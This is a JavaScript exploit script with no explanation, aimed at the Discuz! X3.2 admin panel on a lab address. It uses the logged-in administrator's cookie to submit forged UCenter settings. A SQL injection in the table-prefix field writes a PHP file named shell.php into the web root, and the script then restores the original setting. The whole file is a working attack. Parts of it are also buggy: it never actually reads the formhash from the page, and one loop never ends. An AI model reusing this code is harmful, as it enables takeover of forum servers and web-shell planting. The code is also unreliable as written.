function ajax(){

	var request = false;

	if(window.XMLHttpRequest) {

		request = new XMLHttpRequest();

	} else if(window.ActiveXObject) {

		var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];

		for(var i=0; i<versions.length; i++) {

			try {

				request = new ActiveXObject(versions[i]);			 

			} catch(e) {}			  

		}			  

	}			  

	return request;			  

}

var formhash = '';

var cookie = document.cookie;

var _x = ajax();			  

request_get();



function request_get() {			  

	src="http://192.168.10.70/Discuz_X3.2_SC_UTF8/upload/admin.php?action=misc&operation=custommenu";

	data="";

	xhr_act("GET",src,data);			  

}

function sleep(n){

			var start=new Date().getTime();

			while(true) if(new Date().getTime()-start>n) break;

}

function request_post(flag) {

	src="http://192.168.10.70/Discuz_X3.2_SC_UTF8/upload/admin.php?action=setting&edit=yes";

	if(flag == 1){

	data='\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="formhash"\r\n\r\n3cf53a8d\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="scrolltop"\r\n\r\n\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="anchor"\r\n\r\n\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="operation"\r\n\r\nuc\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][appid]"\r\n\r\n1\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][key]"\r\n\r\n********\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][api]"\r\n\r\nhttp://192.168.10.70/Discuz_X3.2_SC_UTF8/upload/uc_server\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][ip]"\r\n\r\n\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][connect]"\r\n\r\nmysql\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][dbhost]"\r\n\r\nlocalhost\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][dbuser]"\r\n\r\nroot\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][dbpass]"\r\n\r\n********\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][dbname]"\r\n\r\nultrax\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][dbtablepre]"\r\n\r\npre_ucenter_vars union select \'<?php phpinfo()?>\' into outfile \'D:/APMSERVER/APMServ5.2.6/www/htdocs/Discuz_X3.2_SC_UTF8/upload/data/shell.php\'#\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[ucactivation]"\r\n\r\n1\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[fastactivation]"\r\n\r\n0\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[avatarmethod]"\r\n\r\n0\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingsubmit"\r\n\r\næäº¤\r\n-----------------------------2137124919446--';

	}else{

	data='\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="formhash"\r\n\r\n3cf53a8d\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="scrolltop"\r\n\r\n\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="anchor"\r\n\r\n\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="operation"\r\n\r\nuc\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][appid]"\r\n\r\n1\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][key]"\r\n\r\n********\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][api]"\r\n\r\nhttp://192.168.10.70/Discuz_X3.2_SC_UTF8/upload/uc_server\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][ip]"\r\n\r\n\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][connect]"\r\n\r\nmysql\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][dbhost]"\r\n\r\nlocalhost\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][dbuser]"\r\n\r\nroot\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][dbpass]"\r\n\r\n********\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][dbname]"\r\n\r\nultrax\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[uc][dbtablepre]"\r\n\r\npre_ucenter_\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[ucactivation]"\r\n\r\n1\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[fastactivation]"\r\n\r\n0\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingnew[avatarmethod]"\r\n\r\n0\r\n-----------------------------2137124919446\r\nContent-Disposition: form-data; name="settingsubmit"\r\n\r\næäº¤\r\n-----------------------------2137124919446--';

	}

	

	xhr_act("POST",src,data);

}	

		  

function xhr_act(_m,_s,_a){



	if(_m == "GET"){

		_x.open(_m,_s,false);				

		_x.setRequestHeader("Cookie",cookie);			  

		_x.send();			  

		var document_str = _x.responseText;	

		var basestr = 'name="formhash" value="';

		var formhashpos = basestr.indexOf(basestr);

		var realpos = formhashpos + basestr.length;

		formhash = basestr.substr(realpos,8);

		if(formhash){

			var count_0 = 3;

			var count_1 = 3;

			for(var i=0;i<count_0;i++)

				request_post(1)

				

			sleep(1000);

			

			for(var j=0;j<count_1;i++)

				request_post(0)

		}

		

	}else{

		_x.open(_m,_s,false);				

		_x.setRequestHeader("Content-Type","multipart/form-data; boundary=---------------------------2137124919446");

		_x.setRequestHeader("Cookie",cookie);

		_x.send(_a);			  

		return _x.responseText;			 

	}

}
